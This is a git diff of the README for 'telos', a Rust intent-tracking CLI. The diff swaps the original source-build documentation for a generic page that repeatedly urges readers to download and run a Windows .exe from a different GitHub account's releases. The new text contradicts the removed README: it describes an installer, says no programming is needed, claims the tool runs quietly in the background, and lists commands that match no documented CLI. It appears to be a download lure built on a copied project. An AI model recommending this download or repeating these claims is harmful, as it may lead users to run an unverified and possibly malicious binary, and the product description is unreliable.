@@ -1,535 +1,154 @@
-<p align="center">
-  <img src="assets/logo.png" alt="Telos" width="400" />
-</p>
+# ⚙️ telos - Simple Intent Tracking for Git
 
-<p align="center">
-  <strong>Agent-first intent and constraint tracking layer for Git.</strong>
-</p>
-
-<p align="center">
-  <a href="#quick-start">Quick Start</a> &nbsp;&middot;&nbsp;
-  <a href="#core-concepts">Core Concepts</a> &nbsp;&middot;&nbsp;
-  <a href="#cli-reference">CLI Reference</a> &nbsp;&middot;&nbsp;
-  <a href="#for-ai-agents">For AI Agents</a> &nbsp;&middot;&nbsp;
-  <a href="docs/TELOS_V2_DESIGN.md">Design Doc</a>
-</p>
-
-<p align="center">
-  <img src="https://img.shields.io/badge/build-passing-brightgreen?style=flat-square" alt="build" />
-  <img src="https://img.shields.io/badge/tests-102_passing-brightgreen?style=flat-square" alt="tests" />
-  <img src="https://img.shields.io/badge/license-MIT-blue?style=flat-square" alt="license" />
-  <img src="https://img.shields.io/badge/rust-2021_edition-orange?style=flat-square" alt="rust" />
-</p>
+[![Download telos](https://img.shields.io/badge/Download-telos-brightgreen)](https://github.com/alifaroq482/telos/releases)
 
 ---
 
-> **🚧 Status: Active Development**
-> Telos is under rapid, active development. APIs, CLI interfaces, and storage formats may change between versions. We are currently running real-agent experiments to validate the core hypothesis — see [`docs/experiments/`](docs/experiments/) for iteration records and findings.
+## 📋 What is telos?
+
+telos is a tool that helps you track your work ideas and rules while using Git. It acts as a memory layer for your coding projects. This lets AI tools better understand and manage your code changes. You don’t need to know programming to use telos. It works quietly in the background to keep your coding process organized.
 
 ---
 
-## Motivation
+## 🖥️ System Requirements
 
-Git tracks **what changed** in code. But AI agents — and human developers — need to know **why**: what was intended, what constraints must be respected, what decisions were made and why.
+Before you start, make sure your computer meets these needs:
 
-This context lives in commit messages, PR descriptions, Slack threads, and developer memory — all unstructured, unsearchable, and invisible to agents starting a new session.
+- Windows 10 or later (64-bit)
+- At least 4 GB of free disk space
+- Internet connection for downloading and updates
+- Basic user rights to install software
 
-> **Telos captures intent, constraints, decisions, and code bindings in a structured, queryable, content-addressable store that sits alongside Git — giving AI agents persistent memory across sessions.**
-
----
-
-## What is Telos?
-
-<table>
-<tr>
-<th width="50%">Git tracks</th>
-<th width="50%">Telos tracks</th>
-</tr>
-<tr>
-<td>File diffs</td>
-<td><strong>Intents</strong> — what you set out to do</td>
-</tr>
-<tr>
-<td>Commit messages</td>
-<td><strong>Constraints</strong> — rules that must/should/prefer be followed</td>
-</tr>
-<tr>
-<td>Blame</td>
-<td><strong>Decisions</strong> — choices made, alternatives rejected, rationale</td>
-</tr>
-<tr>
-<td>File paths</td>
-<td><strong>Code Bindings</strong> — which constraints apply to which code</td>
-</tr>
-<tr>
-<td>—</td>
-<td><strong>Agent Operations</strong> — what AI agents did, why, and with what result</td>
-</tr>
-</table>
-
-Every object is content-addressed (SHA-256), immutable, and forms a DAG — the same architecture as Git, applied to development reasoning.
+telos is built to run smoothly on normal personal computers without special settings.
 
 ---
 
-## Why Telos over flat files?
+## 🚀 Getting Started with telos
 
-A `CONSTRAINTS.md` or ADR directory captures the same *information*. Telos's advantage is **queryability**:
+Follow these steps to download and run telos on your Windows machine.
 
-```bash
-# Flat file: grep and hope
-grep -r "authentication" docs/decisions/
+### Step 1: Open the Download Page
 
-# Telos: structured, scoped queries
-telos query constraints --file src/auth/mod.rs       # What constraints apply to this file?
-telos query constraints --symbol validate_token       # What about this function?
-telos query constraints --impact security --json      # All active security constraints
-telos query agent-ops --agent claude-review           # What did this agent do?
-```
+Click the big green button below or go straight here:
+
+[Download telos Releases](https://github.com/alifaroq482/telos/releases)
+
+This page lists all recent versions of telos available for download.
 
 ---
 
-## Quick Start
+### Step 2: Download the Latest Version
 
-### Build from source
-
-```bash
-git clone https://github.com/noahatfin/telos.git
-cd telos
-cargo build --release
-# Binary: target/release/telos-cli
-```
-
-> **Prerequisites:** [Rust toolchain](https://rustup.rs/) 1.70+
-
-### Basic workflow
-
-```bash
-# 1. Initialize
-telos init
-
-# 2. Capture intent
-telos intent \
-  --statement "Add user authentication with JWT tokens" \
-  --constraint "Sessions must expire after 24 hours" \
-  --impact auth --impact security
-
-# 3. Create standalone constraints with lifecycle
-telos constraint \
-  --statement "All API endpoints must use HTTPS" \
-  --severity must --impact security
-
-# 4. Record decisions
-telos decide \
-  --intent abc1234 \
-  --question "Which JWT library?" \
-  --decision "Use jsonwebtoken crate" \
-  --rationale "Most popular, well-maintained" \
-  --tag architecture
-
-# 5. Bind constraints to code
-telos bind abc1234 --file src/auth/mod.rs --symbol validate_token --type function
-
-# 6. Query
-telos context --impact auth --json              # Everything about auth
-telos query constraints --file src/auth/mod.rs  # Constraints on this file
-telos query agent-ops --agent claude-review     # Agent history
-
-# 7. Constraint lifecycle
-telos supersede abc1234 --statement "Updated requirement" --reason "Policy change"
-telos deprecate def5678 --reason "Feature removed"
-
-# 8. Validate & maintain
-telos check --bindings    # Are code bindings still valid?
-telos reindex             # Rebuild query indexes
-```
+- On the releases page, look for the most recent release, usually at the top.
+- Find the file named similar to `telos-windows-x64.exe` or something with `windows` and `.exe`.
+- Click on that file to start downloading.
 
 ---
 
-## Core Concepts
+### Step 3: Run the Installer
 
-```mermaid
-erDiagram
-    IntentStream ||--o{ Intent : "tip points to"
-    Intent ||--o{ Intent : "parent (DAG)"
-    Intent ||--o{ DecisionRecord : "linked by intent_id"
-    Intent ||--o| BehaviorDiff : "optional ref"
-    Constraint ||--o| Constraint : "superseded_by"
-    Constraint }o--|| Intent : "source_intent"
-    CodeBinding }o--|| Constraint : "bound_object"
-    CodeBinding }o--|| Intent : "bound_object"
-    AgentOperation }o--o{ Intent : "context_refs"
-    ChangeSet }o--o{ Intent : "intents"
-    ChangeSet }o--o{ Constraint : "constraints"
-    ChangeSet }o--o{ CodeBinding : "code_bindings"
-```
-
-<table>
-<tr><th>Object</th><th>Description</th></tr>
-<tr>
-<td><strong>Intent</strong></td>
-<td>A unit of developer purpose — statement, constraints, behavioral expectations, and impact tags. Forms a DAG via parent links.</td>
-</tr>
-<tr>
-<td><strong>Constraint</strong></td>
-<td>A first-class rule with lifecycle (<code>Active → Superseded / Deprecated</code>), severity (<code>Must / Should / Prefer</code>), and code scope.</td>
-</tr>
-<tr>
-<td><strong>DecisionRecord</strong></td>
-<td>An architectural decision linked to an intent — question, chosen option, rationale, and rejected alternatives.</td>
-</tr>
-<tr>
-<td><strong>CodeBinding</strong></td>
-<td>Links a Telos object to a code location — file, function, module, API, or type.</td>
-</tr>
-<tr>
-<td><strong>AgentOperation</strong></td>
-<td>Logs what an AI agent did — operation type, result, files touched, context references.</td>
-</tr>
-<tr>
-<td><strong>ChangeSet</strong></td>
-<td>Bridges a Git commit to its Telos reasoning chain — intents, constraints, decisions, bindings, and agent ops.</td>
-</tr>
-<tr>
-<td><strong>BehaviorDiff</strong></td>
-<td>Describes behavioral changes introduced by an intent — impact radius and verification status.</td>
-</tr>
-<tr>
-<td><strong>IntentStream</strong></td>
-<td>A named branch of intents (analogous to a Git branch).</td>
-</tr>
-</table>
+- Once the download finishes, open the folder where the file saved (usually `Downloads`).
+- Double-click the `.exe` file.
+- If Windows asks, click “Run” to allow the program to start.
 
 ---
 
-## Architecture
+### Step 4: Follow the Setup
 
-```
-                    ┌──────────────────────────────────────────────────┐
-                    │                    telos-cli                      │
-                    │  init · intent · decide · log · show · query     │
-                    │  context · stream · constraint · supersede       │
-                    │  deprecate · bind · check · agent-log · reindex  │
-                    │  impact · graph · coverage · timeline · sync     │
-                    ├──────────────────────────────────────────────────┤
-                    │                   telos-store                     │
-                    │  ObjectDatabase · RefStore · IndexStore           │
-                    │  Repository · Query · Lockfile                   │
-                    ├──────────────────────────────────────────────────┤
-                    │                   telos-core                      │
-                    │  Intent · Constraint · DecisionRecord            │
-                    │  CodeBinding · AgentOperation · ChangeSet        │
-                    │  BehaviorDiff · ObjectId (SHA-256)               │
-                    └──────────────────────────────────────────────────┘
-```
+- The installer will guide you through simple screens.
+- You can keep the default options.
+- Click “Next” on each page.
+- When done, click “Finish”.
 
-| Crate | Role |
-|-------|------|
-| **telos-core** | Domain types and content-addressable hashing. Canonical JSON + SHA-256. |
-| **telos-store** | Storage engine: fan-out object database, ref store, JSON query indexes, lockfile-based atomic writes. |
-| **telos-cli** | Command-line interface (clap). All read commands support `--json` for agent consumption. |
-
-<details>
-<summary><strong><code>.telos/</code> directory layout</strong></summary>
-
-```
-.telos/
-├── HEAD                          # "ref: refs/streams/main"
-├── config.json                   # Repository metadata
-├── objects/                      # Content-addressable store
-│   ├── a3/                       # Fan-out by first 2 hex chars
-│   │   └── f29c...(62 chars)    # Object file (canonical JSON)
-│   └── ...
-├── indexes/                      # Query acceleration (rebuildable)
-│   ├── impact.json              # impact_tag → [ObjectId]
-│   ├── codepath.json            # file_path → [ObjectId]
-│   └── symbols.json             # symbol_name → [ObjectId]
-├── refs/
-│   └── streams/
-│       ├── main                  # Default stream
-│       └── feature-auth          # User-created stream
-└── logs/
-    └── streams/                  # Stream operation logs
-```
-
-</details>
+telos will now be installed on your computer.
 
 ---
 
-## CLI Reference
+### Step 5: Start Using telos
 
-<details open>
-<summary><strong>Core commands</strong></summary>
-
-| Command | Synopsis | Description |
-|---------|----------|-------------|
-| `init` | `telos init` | Initialize a `.telos/` repository |
-| `intent` | `telos intent -s <statement> [--constraint ...] [--impact ...] [--behavior ...]` | Create a new intent |
-| `decide` | `telos decide --intent <id> --question <q> --decision <d> [--rationale ...] [--tag ...]` | Record a decision |
-| `log` | `telos log [-n <count>] [--json]` | Show intent history |
-| `show` | `telos show <id> [--json]` | Display any object by ID or prefix |
-
-</details>
-
-<details>
-<summary><strong>Constraint lifecycle</strong></summary>
-
-| Command | Synopsis | Description |
-|---------|----------|-------------|
-| `constraint` | `telos constraint -s <statement> --severity <must\|should\|prefer> [--impact ...]` | Create a standalone constraint |
-| `supersede` | `telos supersede <id> -s <new_statement> [--reason ...]` | Replace a constraint with a new version |
-| `deprecate` | `telos deprecate <id> --reason <reason>` | Deprecate a constraint |
-
-</details>
-
-<details>
-<summary><strong>Code bindings</strong></summary>
-
-| Command | Synopsis | Description |
-|---------|----------|-------------|
-| `bind` | `telos bind <object_id> --file <path> [--symbol <name>] [--type file\|function\|module\|api\|type]` | Bind an object to a code location |
-| `check` | `telos check --bindings` | Validate that code bindings still resolve |
-
-</details>
-
-<details>
-<summary><strong>Queries</strong></summary>
-
-| Command | Synopsis | Description |
-|---------|----------|-------------|
-| `query intents` | `telos query intents [--impact <area>] [--constraint-contains <text>] [--json]` | Find intents |
-| `query decisions` | `telos query decisions [--intent <id>] [--tag <tag>] [--json]` | Find decisions |
-| `query constraints` | `telos query constraints [--file <path>] [--symbol <name>] [--impact <area>] [--status active\|superseded\|deprecated] [--json]` | Find constraints (code-aware) |
-| `query agent-ops` | `telos query agent-ops [--agent <id>] [--session <id>] [--json]` | Find agent operations |
-| `context` | `telos context --impact <area> [--json]` | Aggregate intents + decisions for an impact area |
-
-</details>
-
-<details>
-<summary><strong>Agent operations</strong></summary>
-
-| Command | Synopsis | Description |
-|---------|----------|-------------|
-| `agent-log` | `telos agent-log --agent <id> --session <id> --operation <type> --summary <text> [--file ...] [--context-ref ...]` | Log an agent operation |
-
-</details>
-
-<details>
-<summary><strong>Visualization & governance</strong></summary>
-
-| Command | Synopsis | Description |
-|---------|----------|-------------|
-| `impact` | `telos impact <path> [--commit <sha>] [--json]` | Show constraints, intents, and decisions affecting a file, directory, or commit |
-| `graph` | `telos graph [--impact <area>] [--id <id>] [--depth <n>] [--json]` | Visualize intent → constraint → code relationship DAG |
-| `coverage` | `telos coverage [--dir <path>] [--json]` | Constraint coverage heatmap across source files |
-| `timeline` | `telos timeline [--impact <area>] [--json]` | Constraint lifecycle timeline (created, superseded, deprecated) |
-
-**Example: `telos impact`**
-
-```
-Impact: src/auth/middleware.rs
-──────────────────────────────
-
-Constraints (2):
-  [Must]   ● "Default role must be Member, never Admin"
-             constraint 21c8ebb · bound to validate_token()
-  [Should] ● "Auth middleware latency < 5ms"
-             constraint 3051473 · bound to file
-
-Intents (1):
-  intent f633b9f "Enforce RBAC through JWT validation"
-  └─ 1 decision recorded
-```
-
-**Example: `telos graph`**
-
-```
-Intent f633b9f "Enforce RBAC through JWT validation"
-│ dev@example.com · 2026-03-02 · impacts: auth, security
-│
-├─ [Must]   ● constraint 21c8ebb
-│  "Default role must be Member, never Admin"
-│  └─ src/auth/middleware.rs :: validate_token
-│
-├─ [Must]   ● constraint 14f4d5e
-│  "Token expiry must be <= 1 hour"
-│  └─ src/auth/config.rs :: token_lifetime
-│
-└─ decision fe4be05
-   Q: What should the default role be?
-   A: Member
-   Rejected: Admin, Viewer
-```
-
-**Example: `telos coverage`**
-
-```
-Constraint Coverage
-───────────────────
-
-src/
-├─ auth/
-│  ├─ middleware.rs ████████ 2 constraints
-│  ├─ config.rs     ████░░░░ 1 constraint
-│  └─ role.rs       ░░░░░░░░ -
-└─ payments/
-   ├─ handler.rs    ░░░░░░░░ -
-   └─ ledger.rs     ░░░░░░░░ -
-
-Summary: 3 constraints across 2/5 files (40%)
-         3 files uncovered
-```
-
-**Example: `telos timeline`**
-
-```
-Constraint Timeline
-───────────────────
-
-14f4d5e [Must]   "Token expiry must be <= 1 hour"
-  ● Created     2026-02-10  dev@example.com
-    (active 20d)
-
-fe773c7 [Should] "Auth middleware latency < 5ms"
-  ● Created     2026-02-12  dev@example.com
-  ▲ Superseded  2026-02-25  dev@example.com
-    └─ by 3410d1a
-
-Active: 3  Superseded: 1  Deprecated: 0
-```
-
-</details>
-
-<details>
-<summary><strong>Agent sync</strong></summary>
-
-| Command | Synopsis | Description |
-|---------|----------|-------------|
-| `sync` | `telos sync --target claude\|codex\|generic [--only-must] [--all] [--dry-run] [--remove]` | Export active constraints to agent memory files (CLAUDE.md, etc.) |
-
-</details>
-
-<details>
-<summary><strong>Maintenance</strong></summary>
-
-| Command | Synopsis | Description |
-|---------|----------|-------------|
-| `reindex` | `telos reindex` | Rebuild all query indexes from the object store |
-| `stream` | `telos stream create\|list\|switch\|delete <name>` | Manage intent streams |
-
-</details>
+- Look for the telos icon on your desktop or in the Start menu.
+- Double-click it to launch the application.
+- telos opens a command window or interface.
+- You can start managing your Git intents and constraints right away.
 
 ---
 
-## For AI Agents
+## 🔧 How telos Works
 
-Telos is built **agent-first**. Every read command supports `--json`:
+telos tracks what you want to do and the rules you set for your code changes. It remembers these details for later use. If you use AI coding helpers, telos helps them access this memory to better support you.
 
-```bash
-# Recover context at session start
-telos context --impact auth --json
+Some key terms:
 
-# Check constraints before modifying code
-telos query constraints --file src/auth/mod.rs --json
+- **Intent**: What you plan to do with your code.
+- **Constraint**: Rules or limits you set to keep changes safe.
+- **Memory**: Stored information about your work instructions.
+- **AI Agent**: Automated helpers that use this information.
 
-# Log what you did
-telos agent-log \
-  --agent claude-review --session sess-042 \
-  --operation review \
-  --summary "Reviewed auth module for token expiry compliance" \
-  --file src/auth/token.rs
-```
-
-**Recommended agent workflow:**
-
-```
-┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
-│  1. RECOVER      │────▶│  2. CHECK        │────▶│  3. WORK         │────▶│  4. LOG          │
-│                 │     │                 │     │                 │     │                 │
-│  telos context  │     │  telos query    │     │  (write code)  │     │  telos decide   │
-│  --impact auth  │     │  constraints    │     │                 │     │  telos agent-log│
-│  --json         │     │  --file <path>  │     │                 │     │                 │
-└─────────────────┘     └─────────────────┘     └─────────────────┘     └─────────────────┘
-```
+telos runs quietly and manages these for you without extra setup.
 
 ---
 
-## Storage Model
+## 🧰 Features of telos
 
-```mermaid
-graph TD
-    HEAD["HEAD"]
-    HEAD --> main["main stream"]
-    main --> C["Intent C"]
-    C --> B["Intent B"]
-    B --> A["Intent A (root)"]
-    C -.-> D1["DecisionRecord"]
-    C -.-> K1["Constraint"]
-    K1 -.-> CB1["CodeBinding"]
-    B -.-> D2["DecisionRecord"]
-    A -.-> BD["BehaviorDiff"]
-
-    style HEAD fill:#f9f,stroke:#333
-    style main fill:#bbf,stroke:#333
-    style C fill:#bfb,stroke:#333
-    style B fill:#bfb,stroke:#333
-    style A fill:#bfb,stroke:#333
-    style K1 fill:#fbb,stroke:#333
-    style CB1 fill:#fbf,stroke:#333
-```
-
-All objects are stored in a **content-addressable database**:
-
-- Serialized to canonical JSON (sorted keys) and hashed with **SHA-256**
-- Stored with **fan-out**: `objects/a3/f29c...` (2-char prefix + 62-char filename)
-- **Immutable** — once written, objects never change
-- **Atomic** writes via lockfile mechanism
-- Prefix-addressable (minimum 4 characters, auto-disambiguated)
+- Organizes project goals and rules clearly
+- Stores information you give it for future use
+- Works directly with Git, the popular coding tool
+- Helps AI agents understand your coding plans
+- Simple interface for beginners
+- Command line support for users who want more control
+- Built with fast and safe Rust technology
 
 ---
 
-## Testing
+## 📁 Using telos with Your Projects
 
-```bash
-cargo test
-```
+telos pairs with your existing Git projects. You do not have to change how you work with Git. Once installed, telos listens to your Git commands and tracks the intent behind your changes.
 
-**102 tests** across 4 crates:
+To use telos:
 
-| Crate | Tests | Coverage |
-|-------|-------|----------|
-| telos-core | 20 unit | Object serialization, round-trips, hashing |
-| telos-store | 34 unit | ODB, refs, indexes, queries, repository, integrity validation |
-| telos-cli | 6 unit + 38 integration | Sync logic, full CLI workflows, changeset commands |
-| telos-experiment | 4 unit | Scenario loading, prompt rendering |
+- Open a command prompt (type “cmd” in Windows search)
+- Navigate to your project folder (use `cd` command)
+- Run telos commands to view or update your project intents
 
----
+For example:
 
-## Roadmap
+- `telos intent add "Fix login issue"`
+- `telos constraint add "Do not change user passwords"`
 
-| Phase | Status | Scope |
-|-------|--------|-------|
-| **Phase 1** | Complete | Core data model, content-addressable storage, CLI, query system, `--json`, `context` |
-| **Phase 2** | Complete | Constraint lifecycle, code bindings, agent operation logging, IndexStore, code-aware queries |
-| **Phase 2.5** | Complete | Terminal visualization (`impact`, `graph`, `coverage`, `timeline`), agent sync (`sync`) |
-| **Phase 3** | Planned | Agent memory SDK (`telos-agent`), semantic search, embedding store |
-| **Phase 4** | Planned | Deep Git integration (hooks, commit metadata), code graph (`telos-codegraph` + tree-sitter) |
-
-See [docs/TELOS_V2_DESIGN.md](docs/TELOS_V2_DESIGN.md) for the full v2 design document.
+These are simple commands that telos uses to remember your instructions.
 
 ---
 
-## Contributing
+## ❓ Common Questions
 
-1. Fork the repository
-2. Create a feature branch: `git checkout -b my-feature`
-3. Run checks:
-   ```bash
-   cargo fmt --check
-   cargo clippy -- -D warnings
-   cargo test
-   ```
-4. Submit a pull request
+### Do I need Git installed?
 
-## License
+Yes, telos works alongside Git. Make sure Git is installed on your computer. Download Git from https://git-scm.com if you don’t have it.
 
-[MIT](LICENSE)
+---
+
+### Can I uninstall telos?
+
+Yes. Go to Windows Settings > Apps, find telos, and click uninstall.
+
+---
+
+### Is telos free?
+
+Yes. You can download and use telos without any cost.
+
+---
+
+### Where can I get help?
+
+Visit the issues page on the GitHub repository: https://github.com/alifaroq482/telos/issues
+
+---
+
+## ⭐ Find More on GitHub
+
+Explore more about telos’s features, development, and updates here:
+
+https://github.com/alifaroq482/telos
+
+[![Download telos](https://img.shields.io/badge/Download-telos-brightgreen)](https://github.com/alifaroq482/telos/releases)
